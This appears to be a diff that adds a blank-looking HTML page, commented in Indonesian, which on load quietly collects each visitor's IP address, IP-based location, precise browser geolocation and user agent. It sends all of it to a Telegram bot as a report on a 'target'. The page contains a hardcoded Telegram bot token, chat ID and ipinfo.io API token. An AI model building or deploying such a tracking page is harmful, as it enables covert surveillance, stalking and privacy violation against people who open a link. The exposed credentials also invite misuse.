@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lokasi Pengunjung</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        // Fungsi untuk mengirim data ke Telegram
+        function sendDataToTelegram(ip, userAgent, latitude, longitude, city, region, country) {
+            const token = '7338869761:AAHH0UpPDechGAEa-vti2IRO61ix0K8Zyk8'; // Ganti dengan token bot Telegram Anda
+            const chatId = '1360244859'; // Ganti dengan chat ID Anda atau grup
+            const message = `Hei Ari, this is the location target:\n\n` +
+                            `📍 **Location**: ${latitude}, ${longitude}\n` +
+                            `📍 **City**: ${city}\n` +
+                            `📍 **Region**: ${region}\n` +
+                            `📍 **Country**: ${country}\n\n` +
+                            `🌐 **IP**: ${ip}\n` +
+                            `🖥️ **User Agent**: ${userAgent}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => console.log('Pesan dikirim ke Telegram:', data))
+                .catch(error => console.error('Error:', error));
+        }
+
+        // Mendapatkan IP pengunjung menggunakan ipify API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                const userAgent = navigator.userAgent;
+
+                // Menggunakan ipinfo.io untuk mendapatkan lokasi berdasarkan IP
+                fetch(`https://ipinfo.io/${ip}/json?token=73e6af578a05fc`) // Token API Anda
+                    .then(response => response.json())
+                    .then(locationData => {
+                        // Mendapatkan koordinat latitude dan longitude dari ipinfo.io
+                        const [latitude, longitude] = locationData.loc.split(',');
+
+                        // Menyimpan informasi lokasi (kota, wilayah, negara)
+                        const city = locationData.city;
+                        const region = locationData.region;
+                        const country = locationData.country;
+
+                        // Menggunakan Geolocation API untuk mendapatkan data yang lebih akurat
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(function(position) {
+                                const latitude = position.coords.latitude;
+                                const longitude = position.coords.longitude;
+                                // Kirim data ke Telegram
+                                sendDataToTelegram(ip, userAgent, latitude, longitude, city, region, country);
+                            }, function(error) {
+                                console.error("Error getting location from browser: ", error);
+                            });
+                        } else {
+                            // Kirim data IP dan lokasi ipinfo
+                            sendDataToTelegram(ip, userAgent, latitude, longitude, city, region, country);
+                        }
+                    })
+                    .catch(error => console.error('Gagal mendapatkan lokasi berdasarkan IP:', error));
+            })
+            .catch(error => console.error('Gagal mendapatkan IP pengunjung:', error));
+    </script>
+
+</body>
+</html>
